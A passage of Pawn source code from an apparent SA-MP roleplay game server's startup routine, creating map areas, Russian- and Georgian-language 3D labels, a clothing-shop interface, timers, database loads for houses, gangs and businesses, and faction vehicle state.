	gAreas[arWoodUnload] = CreateDynamicSphere(gWoodCPs[7][0],gWoodCPs[7][1],gWoodCPs[7][2],2.0);
	gAreas[arGunWork] = CreateDynamicSphere(2135.2578,-1991.8514,13.6483,1.0,0,0);
	gAreas[arTruckWagonCoal] = CreateDynamicSphere(384.9763,902.6101,20.2163,35.0);
	gAreas[arTruckWagonWood] = CreateDynamicSphere(-2003.7578,-2421.1641,31.6471,25.0);
	gAreas[arTruckUnload] = CreateDynamicSphere(-1903.9177,-1650.0962,21.7500,10.0);
	gAreas[arSellCar] = CreateDynamicSphere(-1656.1304,1209.8882,7.2500,1.0);
	//gAreas[arFilling][0] = CreateDynamicSphere(2217.3040,-1146.6182,1025.7969,1.0);
	gAreas[arAutoExam] = CreateDynamicSphere(1193.0955,-143.4155,922.4449,1.0,1,0);
	gAreas[arInstructorBarrier] = CreateDynamicSphere(-2057.8718,-97.3589,35.1641,10.0,0,0);
	gAreas[arGreenZone][0] = CreateDynamicSphere(-2047.1279,-83.7737,35.1641,60.0,0,0);//АШ
	gAreas[arGreenZone][1] = CreateDynamicSphere(1488.0463,-1732.5757,13.3828,60.0,0,0);//Мэрия
	gAreas[arGreenZone][2] = CreateDynamicSphere(271.8271,-2020.3104,1.4288,200.0,0,0);//Респа
	gAreas[arGreenZone][3] = CreateDynamicSphere(1183.7880,-1324.5862,13.5763,60.0,0,0);//Больница
	gAreas[arGreenZone][4] = CreateDynamicSphere(244.3316,113.3334,1003.2188,40.0,0,10);//Респа [Инт]
	gAreas[arGreenZone][5] = CreateDynamicSphere(131.6461,-214.2265,922.9600,90.0,-1,-1); // Больница ИНТ
	gAreas[arGreenZone][6] = CreateDynamicSphere(2455.2207,1948.4336,10.2781,60.0,0,0); // Стройка
	gAreas[arGreenZone][7] = CreateDynamicSphere(54.5534,-290.3943,954.9484,60.0,1,1); // Авторазбор
	gAreas[arGreenZone][8] = CreateDynamicSphere(2135.2578,-1991.8514,13.6483,20.0,0,0); // Путеец
	gAreas[arGreenZone][9] = CreateDynamicSphere(1364.0875,-1280.7269,13.5469,30.0,0,0); // Около АММО
	gAreas[arGreenZone][10] = CreateDynamicSphere(266.7470,77.2172,1001.0391,15.0,0,6); // ЛСПД
	gAreas[arGreenZone][11] = CreateDynamicSphere(1126.3976,3.0198,1000.6797,40.0,1,12); // КАЗИНО
	gAreas[arBank] = CreateDynamicSphere(163.6033,-1198.0826,2821.4829,2.0);
	gAreas[arHire] = CreateDynamicSphere(-55.5989,-81.5608,1128.0669,1.0,1,0);
	gAreas[arBarrier][0] = CreateDynamicSphere(347.9673,1800.8309,18.5518,2.0);
	gAreas[arBarrier][1] = CreateDynamicSphere(143.1136,1964.7142,19.4872,2.0);
	gAreas[arBarrier][2] = CreateDynamicSphere(462.21, 2540.05, 19.31,2.0);
	gAreas[arArmyAmmo] = CreateDynamicSphere(312.4241,-165.9406,999.6010,1.0);
	gAreas[arFbiAmmo] = CreateDynamicSphere(-68.5939,-96.2105,1087.2069,1.0);
	//gAreas[arArenda1] = CreateDynamicSphere(1700.6056,-1979.0752,14.1172,2.0);
	gAreas[arMeriyaAmmo] = CreateDynamicSphere(-81.7024,-83.8172,1128.0669,1.0);
	gAreas[arMafiaAmmo] = CreateDynamicSphere(2551.6938,-1294.2773,1060.9844,1.0);
	gAreas[arDorm] = CreateDynamicSphere(1303.8409,-811.6581,1624.9728,2.0);
 	gAreas[arPoezdExit] = CreateDynamicSphere(82.9852,-332.5636,1094.8015,1.0);
 	gAreas[arYniver][0] = CreateDynamicSphere(-96.8171,-13.2540,1151.1399,1.0);
 	gAreas[arYniver][1] = CreateDynamicSphere(-79.5226,-20.7606,1151.1399,1.0);
 	gAreas[arYniver][2] = CreateDynamicSphere(-71.6005,-20.7362,1151.1399,1.0);
	gAreas[arGangHP] = CreateDynamicSphere(1300.8990,-828.4949,1624.9728,1.0);
	gAreas[arPDD] = CreateDynamicSphere(1177.2299,-144.1255,922.4449,1.5);
	gAreas[arPDD1] = CreateDynamicSphere(1183.1179,-120.8024,922.4449,1.5);
	gAreas[arGangWeap] = CreateDynamicSphere(1299.5559,-821.3093,1624.9728,1.0);
	gAreas[arTyrmaHP] = CreateDynamicSphere(-311.8397,-233.4846,1082.7289,1.0);
	gAreas[arOtelHP] = CreateDynamicSphere(1706.0703,-1651.4092,20.2205,1.0);
	gAreas[arOtelBAR] = CreateDynamicSphere(1703.0901,-1659.7465,20.2198,1.0);
	gAreas[arArrest] = CreateDynamicRectangle(1605.5659,-1635.0826,1620.1270,-1614.5710,-1,6);
	gAreas[arCasino] = CreateDynamicSphere(1130.2373,-13.4374,1000.6797,1.0);
	gAreas[arSelo2] = CreateDynamicSphere(-1091.7751,-1057.1841,129.2119,1.0);
	gAreas[arSeloVxod][0] = CreateDynamicSphere(-1054.5221,-1036.7003,129.2188,1.0);
	gAreas[arSeloVxod][1] = CreateDynamicSphere(-1054.5198,-965.8053,129.2188,1.0);
	gAreas[arSeloVxod][2] = CreateDynamicSphere(-1142.9214,-962.5409,129.2188,1.0);
	gAreas[arSeloVxod][3] = CreateDynamicSphere(-1142.9067,-1031.4019,129.2188,1.0);
	gAreas[arSeloVxod][4] = CreateDynamicSphere(299.8485,310.3893,1003.3047,1.0);
	gAreas[arPoezd][0] = CreateDynamicSphere(1765.3303,-1940.9227,13.5696,1.0);
	gAreas[arPoezd][1] = CreateDynamicSphere(-1970.7937,157.8173,27.6875,1.0);
	gAreas[arPoezd][2] = CreateDynamicSphere(2853.1799,1290.0969,11.3906,1.0);

	for(new i;i<5;i++)
	{
		gAreas[arGang][i] = CreateDynamicSphere(gGangEnter[i][0],gGangEnter[i][1],gGangEnter[i][2],1.0,0,0);
	}
	gAreas[arGangExit] = CreateDynamicSphere(1294.6316,-823.7710,1624.9728,1.0,-1,5);
	gEmCall[0] = INVALID_PLAYER_ID;
	gEmCall[1] = INVALID_PLAYER_ID;
	gEmCall[2] = INVALID_PLAYER_ID;
	for(new i;i<TELEPORTS_COUNT;i++)
	{
		CreateDynamicPickup(1318,1,gTeleports[i][0][0],gTeleports[i][0][1],gTeleports[i][0][2],gTeleportData[i][0][0]);
		CreateDynamicPickup(1318,1,gTeleports[i][1][0],gTeleports[i][1][1],gTeleports[i][1][2],gTeleportData[i][1][0]);
		gTeleportAreas[i][0] = CreateDynamicSphere(gTeleports[i][0][0],gTeleports[i][0][1],gTeleports[i][0][2],2.0,gTeleportData[i][0][0],gTeleportData[i][0][1]);
		gTeleportAreas[i][1] = CreateDynamicSphere(gTeleports[i][1][0],gTeleports[i][1][1],gTeleports[i][1][2],2.0,gTeleportData[i][1][0],gTeleportData[i][1][1]);
	}
	for(new i;i<ATM_COUNT;i++)
	{
	    CreateDynamic3DTextLabel("Банкомат\n{"#cYELLOW"}Daajiret ALT-s",CGREEN,gATMC[i][0],gATMC[i][1],gATMC[i][2],8.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
		CreateDynamicObject(2754,gATMC[i][0],gATMC[i][1],gATMC[i][2],gATMC[i][3],gATMC[i][4],gATMC[i][5]);
		gATMArea[i] = CreateDynamicSphere(gATMC[i][0],gATMC[i][1],gATMC[i][2],1.0);
	}
	CreateDynamicPickup(1275,1,-68.5939,-96.2105,1087.2069); // ФБР пикап
	CreateDynamicPickup(1275,1,210.8590,147.9079,1003.0234);

	//3D тексты

	CreateDynamic3DTextLabel("{"#cYELLOW"}Otaxi №1",0xBFF600FF,1708.7024,-1670.2324,23.7057+1.5,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{"#cYELLOW"}Otaxi №2",0xBFF600FF,1708.7043,-1665.0304,23.7044+1.5,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{"#cYELLOW"}Otaxi №3",0xBFF600FF,1708.7029,-1659.8270,23.7031+1.5,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{"#cYELLOW"}Otaxi №4",0xBFF600FF,1708.7021,-1654.5770,23.7018+1.5,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{"#cYELLOW"}Otaxi №5",0xBFF600FF,1708.7019,-1649.3079,23.6953+1.5,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{"#cYELLOW"}Otaxi №6",0xBFF600FF,1735.0483,-1642.2540,23.7578+1.5,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{"#cYELLOW"}Otaxi №7",0xBFF600FF,1735.0646,-1648.1945,23.7448+1.5,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{"#cYELLOW"}Otaxi №8",0xBFF600FF,1735.0820,-1654.0867,23.7318+1.5,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{"#cYELLOW"}Otaxi №9",0xBFF600FF,1735.0988,-1660.0123,23.7188+1.5,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{"#cGREEN"}Otaxi №10",0xBFF600FF,1708.7017,-1670.2111,27.1953+1.5,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{"#cGREEN"}Otaxi №11",0xBFF600FF,1708.7028,-1665.0184,27.1953+1.5,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{"#cGREEN"}Otaxi №12",0xBFF600FF,1708.7098,-1659.7622,27.1953+1.5,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{"#cGREEN"}Otaxi №13",0xBFF600FF,1708.7083,-1654.5234,27.1953+1.5,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{"#cGREEN"}Otaxi №14",0xBFF600FF,1708.7184,-1649.2904,27.1953+1.5,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{"#cGREEN"}Otaxi №15",0xBFF600FF,1735.0482,-1642.3508,27.2392+1.5,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{"#cGREEN"}Otaxi №16",0xBFF600FF,1735.0631,-1648.2434,27.2304+1.5,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{"#cGREEN"}Otaxi №17",0xBFF600FF,1735.0767,-1654.1727,27.2216+1.5,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	CreateDynamic3DTextLabel("{"#cGREEN"}Otaxi №18",0xBFF600FF,1735.0927,-1660.0815,27.2128+1.5,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);

	CreateDynamic3DTextLabel("Нажмите H",CWHITE,-1917.2198,295.4781,41.0469,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,0);
	CreateDynamic3DTextLabel("Нажмите H",CWHITE,2384.6409,1026.9692,10.8203,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,0);
	CreateDynamic3DTextLabel("Нажмите H",CWHITE,1015.3531,-1438.2787,13.5469,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,0);

    CreateDynamic3DTextLabel("Нажмите {"#cGREEN"}ALT",CWHITE,-1.7590,382.9603,1043.7756,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,6,6);
    CreateDynamic3DTextLabel("Нажмите {"#cGREEN"}ALT",CWHITE,-1.7310,386.5650,1043.7756,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,6,6);
    CreateDynamic3DTextLabel("Нажмите {"#cGREEN"}ALT",CWHITE,-4.2970,386.5428,1043.7756,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,6,6);
    CreateDynamic3DTextLabel("Нажмите {"#cGREEN"}ALT",CWHITE,-4.2930,383.2103,1043.7756,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,6,6);
    CreateDynamic3DTextLabel("Нажмите {"#cGREEN"}ALT",CWHITE,-4.6460,389.2099,1043.7756,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,6,6);
    CreateDynamic3DTextLabel("Нажмите {"#cGREEN"}ALT",CWHITE,-6.5778,389.2104,1043.7756,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,6,6);
    CreateDynamic3DTextLabel("Нажмите {"#cGREEN"}ALT",CWHITE,0.2692,389.2097,1043.7756,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,6,6);
    CreateDynamic3DTextLabel("Нажмите {"#cGREEN"}ALT",CWHITE,0.8463,387.4106,1043.7756,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,6,6);
    CreateDynamic3DTextLabel("Нажмите {"#cGREEN"}ALT",CWHITE,-7.1549,387.3505,1043.7756,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,6,6);

    CreateDynamic3DTextLabel("{"#cYELLOW"}Камера #1",0xBFF600FF,-310.6909,-257.2500,1082.7289+1.0,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1);
    CreateDynamic3DTextLabel("{"#cYELLOW"}Камера #2",0xBFF600FF,-310.6935,-262.6185,1082.7289+1.0,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1);
    CreateDynamic3DTextLabel("{"#cYELLOW"}Камера #3",0xBFF600FF,-310.6912,-267.9289,1082.7289+1.0,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1);
    CreateDynamic3DTextLabel("{"#cYELLOW"}Камера #4",0xBFF600FF,-310.7006,-273.1307,1082.7289+1.0,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1);
    CreateDynamic3DTextLabel("{"#cYELLOW"}Камера #5",0xBFF600FF,-319.0814,-257.3622,1082.7289+1.0,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1);
    CreateDynamic3DTextLabel("{"#cYELLOW"}Камера #6",0xBFF600FF,-319.0825,-262.6073,1082.7289+1.0,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1);
    CreateDynamic3DTextLabel("{"#cYELLOW"}Камера #7",0xBFF600FF,-319.0825,-267.8094,1082.7289+1.0,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1);
    CreateDynamic3DTextLabel("{"#cYELLOW"}Камера #8",0xBFF600FF,-319.0816,-273.3595,1082.7289+1.0,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1);

    CreateDynamic3DTextLabel("PDD Wesebi",CWHITE,1177.2299,-144.1255,922.4449,6.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
    CreateDynamic3DTextLabel("{"#cYELLOW"}Iuridiuliй Ganatleba",0xBFF600FF,-89.9313,-13.3518,1151.1399+1.0,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1);
    CreateDynamic3DTextLabel("{"#cYELLOW"}Medikaluri Ganatleba",0xBFF600FF,-80.4548,-7.6386,1151.1399+1.0,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1);
    CreateDynamic3DTextLabel("{"#cYELLOW"}Jurnalistis Ganatleba",0xBFF600FF,-72.6163,-7.6045,1151.1399+1.0,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1);
    CreateDynamic3DTextLabel("{ffffff}Используйте: {1e90ff}/buygrain",0xFF0000FF,323.0342,1118.5804,1083.8828,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
    CreateDynamic3DTextLabel("{1e90ff}/gocar",0xFF0000FF,1394.4858,-19.7839,1000.9229,6.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,18,-1);
    CreateDynamic3DTextLabel("{"#cYELLOW"}Покупка Kit для т.с\n{"#cGREEN"}Kit - сборка двигателя",0xBFF600FF,57.6946,-316.2592,954.9484,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1);
	CreateDynamic3DTextLabel("Нажмите Y",CGREEN,1387.5725,-25.3795,1000.9229,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,18,-1);
    CreateDynamic3DTextLabel("Нажмите Y",CGREEN,1384.5718,-25.8539,1000.9229,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,18,-1);
    CreateDynamic3DTextLabel("Нажмите Y",CGREEN,304.6951,307.3586,999.1484,3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,4,-1);
	CreateDynamic3DTextLabel("/gohome",CWHITE,1380.5771,-13.3953,1000.9246,3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,18,-1);
    CreateDynamic3DTextLabel("{CDB5B5}/exitcamera - выйти из камеры\nALT - войти в камеру",CWHITE,-315.0161,-267.5797,1082.7289,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1);
    CreateDynamic3DTextLabel("Игра в ОЧКО\n{"#cGREEN"}Введите /start",CWHITE,963.1946,2144.6165,1011.0216,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,-1);
    CreateDynamic3DTextLabel("Игра в ОЧКО\n{"#cGREEN"}Введите /start",CWHITE,963.2963,2138.5278,1011.0234,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,-1);
    CreateDynamic3DTextLabel("Игровые автоматы\n{"#cGREEN"}Введите /start",CWHITE,1126.3542,3.0123,1000.6797,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,12,1);
    CreateDynamic3DTextLabel("Игровые автоматы\n{"#cGREEN"}Введите /start",CWHITE,1132.7922,-1.6417,1000.6797,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,12,1);
    CreateDynamic3DTextLabel("Игровые автоматы\n{"#cGREEN"}Введите /start",CWHITE,1127.4092,-1.6142,1000.6797,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,12,1);
    CreateDynamic3DTextLabel("Колесо удачи\n{"#cGREEN"}Нажмите ENTER",CWHITE,1119.0302,-1.7804,1000.6910,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,12,1);
    CreateDynamic3DTextLabel("Уроки по стрельбе\n{"#cGREEN"}Daajiret ALT-s",CWHITE,308.1019,-168.8626,999.5938,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,6,6);
    CreateDynamic3DTextLabel("/exithotel - выйти из комнаты\n",CWHITE,-2168.4731,642.3249,1057.5938,3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,-1);
    CreateDynamic3DTextLabel("Bankis Momsaxureba",CGREEN,163.6033,-1198.0826,2821.4829,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
	gArmyWarehouseText[0] = CreateDynamic3DTextLabel("_",CWHITE,312.4241,-165.9406,1000.3010,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,0);
	gArmyWarehouseText[1] = CreateDynamic3DTextLabel("_",CWHITE,312.4241,-165.9406,1000.3010,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,1);
	gPDWarehouseText[0] = CreateDynamic3DTextLabel("_",CWHITE,312.4241,-165.9406,1000.3010,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,2);
	gPDWarehouseText[1] = CreateDynamic3DTextLabel("_",CWHITE,312.4241,-165.9406,1000.3010,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,3);
	gPDWarehouseText[2] = CreateDynamic3DTextLabel("_",CWHITE,312.4241,-165.9406,1000.3010,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,4);
	gGangDormText[0] = CreateDynamic3DTextLabel("_",CWHITE,1303.8409,-811.6581,1624.9728,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,0);
	gGangDormText[1] = CreateDynamic3DTextLabel("_",CWHITE,1303.8409,-811.6581,1624.9728,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,1);
	gGangDormText[2] = CreateDynamic3DTextLabel("_",CWHITE,1303.8409,-811.6581,1624.9728,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,2);
	gGangDormText[3] = CreateDynamic3DTextLabel("_",CWHITE,1303.8409,-811.6581,1624.9728,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,3);
	gGangDormText[4] = CreateDynamic3DTextLabel("_",CWHITE,1303.8409,-811.6581,1624.9728,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,4);

	//Кнопки
	gBarrierButton[0] = CreateButton(347.42, 1800.57, 19.03, 304.0);
	gBarrierButton[2] = CreateButton(458.96, 2537.79, 19.70, 315.0);
	//gBarrierButton[3] = CreateButton(1543.84, -1632.68, 13.49, 0.0);	//LSPD
	gBarrierButton[4] = CreateButton(-1572.18, 656.85, 7.55, 0.0);	//SFPD1
	gBarrierButton[5] = CreateButton(-1701.52, 689.60, 25.05, 180.0);	//SFPD2

	//Тексты
	for(new i;i<MAX_PLAYERS;i++)
	{
		gCalls[i][g_caller] = INVALID_PLAYER_ID;
		gCalls[i][g_callee] = INVALID_PLAYER_ID;
	}
	// Магазин одежды
	gSkinShopDraw[0] = TextDrawCreate(88.000000, 242.000000, "~>~");
	TextDrawBackgroundColor(gSkinShopDraw[0], 255);
	TextDrawFont(gSkinShopDraw[0], 1);
	TextDrawLetterSize(gSkinShopDraw[0], 0.500000, 2.000000);
	TextDrawColor(gSkinShopDraw[0], -1);
	TextDrawSetOutline(gSkinShopDraw[0], 0);
	TextDrawSetProportional(gSkinShopDraw[0], 1);
	TextDrawSetShadow(gSkinShopDraw[0], 1);
	TextDrawTextSize(gSkinShopDraw[0], 107.000000, 22.000000);
	TextDrawSetSelectable(gSkinShopDraw[0], 1);

	gSkinShopDraw[1] = TextDrawCreate(18.000000, 242.000000, "~<~");
	TextDrawBackgroundColor(gSkinShopDraw[1], 255);
	TextDrawFont(gSkinShopDraw[1], 1);
	TextDrawLetterSize(gSkinShopDraw[1], 0.500000, 2.000000);
	TextDrawColor(gSkinShopDraw[1], -1);
	TextDrawSetOutline(gSkinShopDraw[1], 0);
	TextDrawSetProportional(gSkinShopDraw[1], 1);
	TextDrawSetShadow(gSkinShopDraw[1], 1);
	TextDrawTextSize(gSkinShopDraw[1], 36.000000, 22.000000);
	TextDrawSetSelectable(gSkinShopDraw[1], 1);

	gSkinShopDraw[2] = TextDrawCreate(115.000000, 221.000000, "_");
	TextDrawBackgroundColor(gSkinShopDraw[2], 0x00000066);
	TextDrawBoxColor(gSkinShopDraw[2], 0x00000066);
	TextDrawFont(gSkinShopDraw[2], 1);
	TextDrawLetterSize(gSkinShopDraw[2], 0.000000, 7.199996);
	TextDrawUseBox(gSkinShopDraw[2], 1);
	TextDrawTextSize(gSkinShopDraw[2], 11.000000, 0.000000);
	TextDrawSetSelectable(gSkinShopDraw[2], 0);

	gSkinShopDraw[3] = TextDrawCreate(45.000000, 245.000000, "BUY");
	TextDrawBackgroundColor(gSkinShopDraw[3], 255);
	TextDrawFont(gSkinShopDraw[3], 3);
	TextDrawLetterSize(gSkinShopDraw[3], 0.629999, 1.500000);
	TextDrawColor(gSkinShopDraw[3], -1);
	TextDrawSetOutline(gSkinShopDraw[3], 0);
	TextDrawSetProportional(gSkinShopDraw[3], 1);
	TextDrawSetShadow(gSkinShopDraw[3], 1);
	TextDrawTextSize(gSkinShopDraw[3], 83.000000, 15.000000);
	TextDrawSetSelectable(gSkinShopDraw[3], 1);


	gSkinShopDraw[4] = TextDrawCreate(30.000000, 268.000000, "CANCEL");
	TextDrawBackgroundColor(gSkinShopDraw[4], 255);
	TextDrawFont(gSkinShopDraw[4], 3);
	TextDrawLetterSize(gSkinShopDraw[4], 0.629998, 1.500000);
	TextDrawColor(gSkinShopDraw[4], -1);
	TextDrawSetOutline(gSkinShopDraw[4], 0);
	TextDrawSetProportional(gSkinShopDraw[4], 1);
	TextDrawSetShadow(gSkinShopDraw[4], 1);
	TextDrawTextSize(gSkinShopDraw[4], 101.000000, 15.000000);
	TextDrawSetSelectable(gSkinShopDraw[4], 1);

	SetTimer("MinuteTimer",120000,true);
	SetTimer("MainTimer",1000,true);
	mysql_tquery(mysql, "SELECT * FROM `hints`",						"HintLoad", "");
	mysql_tquery(mysql, "SELECT * FROM `casino` ORDER BY `id`",			"CasinoLoad", "");
	mysql_tquery(mysql, "SELECT * FROM `houses` ORDER BY `id`",			"HouseLoad", "");
	mysql_tquery(mysql, "SELECT * FROM `transport` ORDER BY `model`",	"TransportLoad", "");
	mysql_tquery(mysql, "SELECT * FROM `fillings` ORDER BY `id`",		"FuelLoad", "");
	mysql_tquery(mysql, "SELECT * FROM `gangs` ORDER BY `id`",			"GangLoad", "");
	mysql_tquery(mysql, "SELECT * FROM `bints` ORDER BY `id`",			"BintsLoad", "");
	mysql_tquery(mysql, "SELECT * FROM `business` ORDER BY `id`",		"BusinessLoad", "");
	mysql_tquery(mysql, "SELECT * FROM `gangzone`",						"GangzoneLoad", "");

	for(new i; i<= aTaxi[1];i++)
	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}
	for(new i; i<= aMech[1];i++)
	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}
    for(new i; i<= aInstructor[1];i++)
	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}
	for(new i; i<= aHotel[0][1];i++)
	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}
	for(new i; i<= aHotel[1][1];i++)
	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}
	for(new i; i<= aHotel[2][1];i++)
	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}
	for(new i; i<= aHospital[0][1];i++)
	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}
	for(new i; i<= aHospital[1][1];i++)
	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}
	for(new i; i<= aHospital[2][1];i++)
	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}
	for(new i; i<= aArmy1[1];i++)
	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}
	for(new i; i<= aArmy2[1];i++)
	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}
	for(new i; i<= aLSPD[1];i++)
	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}
	for(new i; i<= aSFPD[1];i++)
	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}
	for(new i; i<= aLVPD[1];i++)
	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}
	for(new i; i<= aNews[1];i++)
	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}
	for(new i; i<= aFbi[1];i++)
	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}
	for(new i; i<= aColomb[1];i++)
	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}
	for(new i; i<= aMer[1];i++)
	{
		if(GetVehicleModel(i) >= 400 && i > 0)
		{
			gVehicles[i-1][vFuel] = 100;
			gVehicles[i-1][vLock] = 0;
			gVehicles[i-1][vID] = i;
		}
	}
	for(new i; i<= aMexico[1];i++)
